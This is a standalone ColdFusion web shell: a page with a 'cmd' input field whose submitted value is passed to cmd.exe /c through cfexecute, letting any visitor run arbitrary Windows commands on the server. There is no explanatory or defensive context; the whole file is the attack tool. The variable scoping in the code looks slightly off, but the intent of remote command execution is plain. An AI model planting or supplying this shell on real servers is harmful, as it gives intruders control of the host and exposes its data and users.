<cfoutput><input name="cmd"></cfoutput>
<cfif IsDefined("form.cmd")><cfexecute name="cmd.exe" arguments="/c #variables.cmd#"></cfexecute></cfif>
